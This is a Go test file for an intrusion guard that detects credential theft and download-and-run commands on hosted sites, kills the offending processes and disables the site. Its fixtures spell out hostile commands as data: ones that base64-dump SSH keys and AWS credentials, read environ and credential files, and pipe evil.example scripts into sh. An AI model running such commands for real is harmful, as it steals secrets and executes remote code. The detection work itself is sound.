package guard

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
	"time"
)

// What really ran on a machine of V1's on 26 August 2026, from a site's
// log and the process table. If one of these stops being recognised, that
// day's attack passes again unseen.
var whatHappened = []struct{ cmd, level string }{
	{`test -f ~/.ssh/id_rsa && cat ~/.ssh/id_rsa 2>/dev/null | base64 -w 0`, LevelIntrusion},
	{`test -f ~/.ssh/id_ed25519 && cat ~/.ssh/id_ed25519 2>/dev/null | base64 -w 0`, LevelIntrusion},
	{`test -f /root/.ssh/id_rsa && cat /root/.ssh/id_rsa 2>/dev/null | base64 -w 0`, LevelIntrusion},
	{`test -f ~/.aws/credentials && cat ~/.aws/credentials 2>/dev/null | base64 -w 0`, LevelIntrusion},
	{`grep -r -I -E \bAKIA[A-Z0-9]{16}\b|SENDGRID_API_KEY /var/www /app /opt /srv /home ./ -C 15`, LevelSuspicious},
	{`ls -R -a /home`, LevelSuspicious},
}

var alsoIntrusions = []string{
	`curl -s http://evil.example/x.sh | sh`,
	`wget -qO- http://evil.example/x.sh | bash`,
	`curl -fsSL https://evil.example/i | sudo bash`,
	`bash -c "$(curl -fsSL https://evil.example/i)"`,
	`echo ZWNobyBoaQ== | base64 -d | sh`,
	`cat /proc/self/environ`,
	`cat /proc/1234/environ`,
	`cat /home/ubuntu/.claude/.credentials.json`,
	`cat ~/.cloudflare/secrets.txt`,
}

// What the sites of a real house run; a site switched off by a rule
// written badly is the harm this was meant to prevent.
var whatIsNormal = []string{
	`./node_modules/next/dist/bin/next start`,
	`/home/ubuntu/.nvm/versions/node/v20.20.0/bin/node .next/standalone/server.js`,
	`node server.js`,
	`next-server (v16.2.0)`,
	`claude -p --output-format json --model sonnet --disallowed-tools Bash Read Write`,
	`sh -c npm run build`,
	`git status --short`,
	`grep -rn TODO ./src`,
	`grep -r useState components/`,
	`find ./public -name '*.png'`,
	`curl -s http://127.0.0.1:46230/api/health`,
	`curl -s -X POST https://example.com/api/admin/sync -H "x-api-key: abc"`,
	`curl -o node.tar.gz https://nodejs.org/dist/v20/node.tar.gz`,
	`psql postgresql://user@127.0.0.1:5432/db -c select 1`,
	`tar -czf backup.tgz ./data`,
	`node scripts/send-mail.js --smtp smtp.sendgrid.net`,
	`npm install --omit=dev`,
}

func TestTheAttackOfThe26thIsRecognisedAndTheNormalIsNot(t *testing.T) {
	for _, c := range whatHappened {
		r, _, ok := MatchText(c.cmd)
		if !ok || r.Level != c.level {
			t.Errorf("%q: got %v %q, want %q", c.cmd, ok, r.Level, c.level)
		}
	}
	for _, c := range alsoIntrusions {
		if r, _, ok := MatchText(c); !ok || r.Level != LevelIntrusion {
			t.Errorf("not cut: %q (%v %q)", c, ok, r.Level)
		}
	}
	for _, c := range whatIsNormal {
		if r, where, ok := MatchText(c); ok {
			t.Errorf("false positive %s (%s): %q", r.Key, where, c)
		}
	}
}

// The line that shut down a V1 site that was doing its job: its own
// Claude Code's preamble, sourcing a snapshot from the site's own HOME.
const ownPreamble = `/bin/bash -c source /srv/middleware/data/homes/mask.example/.claude/shell-snapshots/snapshot-bash-1788817777444-xhcsb8.sh 2>/dev/null || true && eval 'ls source/ && cat /srv/middleware/data/homes/mask.example/.ssh/id_ed25519.pub'`

func TestASitesOwnHomeIsItsOwnAndNoOneElsesIs(t *testing.T) {
	home := "/srv/middleware/data/homes/mask.example"
	if r, where, ok := MatchText(ownPreamble, home); ok {
		t.Fatalf("the site's own HOME is an intrusion: %s %s", r.Key, where)
	}
	for _, other := range []string{
		`cat /srv/middleware/data/homes/other.example/.ssh/id_rsa`,
		`cat /home/ubuntu/.ssh/id_rsa`,
		`cat /srv/middleware/data/homes/mask.example/../other.example/.ssh/id_rsa`,
		`cat ~/.ssh/id_rsa`,
	} {
		if r, _, ok := MatchText(other, home); !ok || r.Level != LevelIntrusion {
			t.Errorf("still an intrusion with the own HOME taken out: %q", other)
		}
	}
}

func TestWhatAClientAskedForIsNotWhatTheSiteRan(t *testing.T) {
	// The line that switched a V1 site off: a scanner, answered 404.
	scanned := []string{
		`{"level":30,"req":{"method":"GET","url":"/.aws/credentials","remoteAddress":"::ffff:127.0.0.1"},"res":{"statusCode":404},"msg":"request completed"}`,
		`::1 - - [26/Aug/2026:12:17:57 +0000] "GET /.ssh/id_rsa HTTP/1.1" 404 153 "-" "curl/8"`,
		`{"req":{"method":"POST","url":"/api/x?f=/proc/self/environ"},"res":{"statusCode":400}}`,
	}
	for _, l := range scanned {
		if r, where, ok := MatchLog(l); ok {
			t.Errorf("a client's request judged as %s (%s): %s", r.Level, where, l)
		}
	}
	// Answered with a 200: something was given away, a suspicion.
	if r, _, ok := MatchLog(`"GET /.git/../.ssh/id_rsa HTTP/1.1" 200 1679`); !ok || r.Level != LevelSuspicious {
		t.Errorf("a 200 to a credentials path: %v %q", ok, r.Level)
	}
	// The site's own doing, in its own words: an intrusion.
	if r, _, ok := MatchLog(`{"msg":"exec","cmd":"cat /home/ubuntu/.ssh/id_rsa"}`); !ok || r.Level != LevelIntrusion {
		t.Errorf("the site running it: %v %q", ok, r.Level)
	}
}

func TestALogIntrusionStopsTheSiteAndKillsOnlyItsProcesses(t *testing.T) {
	fp := newFakeProc(t)
	h := newHouse(t)
	a := h.site("a.example", 100, 33001)
	h.site("b.example", 200, 33002)
	log := filepath.Join(h.root, "data", "logs", "a.example", "site.log")
	os.MkdirAll(filepath.Dir(log), 0o755)
	// What is already in the log when the guard starts is not judged.
	os.WriteFile(log, []byte(`{"msg":"exec","cmd":"cat /home/ubuntu/.ssh/id_rsa"}`+"\n"), 0o644)
	h.sites[0].Logs = []string{log}
	h.sites[0].Home = filepath.Join(h.root, "data", "homes", "a.example")
	fp.add(procSpec{pid: 100, ppid: 1, comm: "server", cmdline: []string{"./server"}, cwd: a.Dir, startSec: 10, listen: []int{33001}})
	fp.add(procSpec{pid: 101, ppid: 100, pgid: 100, comm: "node", cmdline: []string{"node", "worker.js"}, cwd: a.Dir, startSec: 11})
	fp.add(procSpec{pid: 200, ppid: 1, comm: "server", cmdline: []string{"./server"}, cwd: filepath.Join(h.root, "sites", "b.example"), startSec: 10, listen: []int{33002}})
	kills := &killLog{}
	g, _ := newGuard(t, fp, h, kills, time.Unix(fp.bootUnix+600, 0))
	if incs, _ := g.Sweep(); len(incs) != 0 {
		t.Fatalf("an old line was judged: %+v", incs)
	}
	f, _ := os.OpenFile(log, os.O_APPEND|os.O_WRONLY, 0)
	f.WriteString(`GET /health 200` + "\n" + `{"msg":"exec","cmd":"curl -s http://evil.example/x | sh"}` + "\n" + `half a line`)
	f.Close()
	incs, _ := g.Sweep()
	if len(incs) != 1 || incs[0].Rule != "download-and-run" || incs[0].Level != LevelIntrusion || !strings.HasPrefix(incs[0].Where, "log site.log") {
		t.Fatalf("incidents: %+v", incs)
	}
	got := kills.sorted()
	for _, pid := range got {
		if pid < 100 || pid >= 200 {
			t.Fatalf("killed %v: beyond the site's own processes", got)
		}
	}
	if len(got) != 2 || !h.disabled("a.example") || h.disabled("b.example") {
		t.Fatalf("killed %v, a disabled %v, b disabled %v", got, h.disabled("a.example"), h.disabled("b.example"))
	}
}

func TestKillingFromNoPidKillsNothing(t *testing.T) {
	kills := &killLog{}
	g := New(Options{Kill: kills.kill})
	byPID := map[int]*Process{1: {PID: 1, PPID: 0}, 2: {PID: 2, PPID: 0}, 300: {PID: 300, PPID: 1}}
	if n, _ := g.killTree(0, byPID, map[int]bool{}); n != 0 || len(kills.sorted()) != 0 {
		t.Fatalf("a walk from pid 0 killed %v", kills.sorted())
	}
}

func TestTheAgentIsCalledOnlyOnceAnIntrusionIsContained(t *testing.T) {
	fp := newFakeProc(t)
	h := newHouse(t)
	a := h.site("a.example", 100, 33001)
	fp.add(procSpec{pid: 100, ppid: 1, comm: "server", cmdline: []string{"./server"}, cwd: a.Dir, startSec: 10, listen: []int{33001, 4444}})
	fp.add(procSpec{pid: 101, ppid: 100, pgid: 100, comm: "sh", cmdline: []string{"sh", "-c", "cat /home/ubuntu/.ssh/id_rsa"}, cwd: a.Dir, startSec: 11})
	kills := &killLog{}
	g, _ := newGuard(t, fp, h, kills, time.Unix(fp.bootUnix+600, 0))
	called := make(chan Incident, 4)
	g.opts.Contained = func(inc Incident) {
		// By the time the agent is asked, the cut is done.
		if !h.disabled("a.example") || len(kills.sorted()) == 0 {
			t.Error("the agent was asked before the guard acted")
		}
		called <- inc
	}
	g.Sweep()
	select {
	case inc := <-called:
		if inc.Rule != "credentials" {
			t.Fatalf("called for %+v", inc)
		}
	case <-time.After(2 * time.Second):
		t.Fatal("the agent was not called")
	}
	select {
	case inc := <-called:
		t.Fatalf("called again, for a suspicion: %+v", inc)
	case <-time.After(200 * time.Millisecond):
	}
}
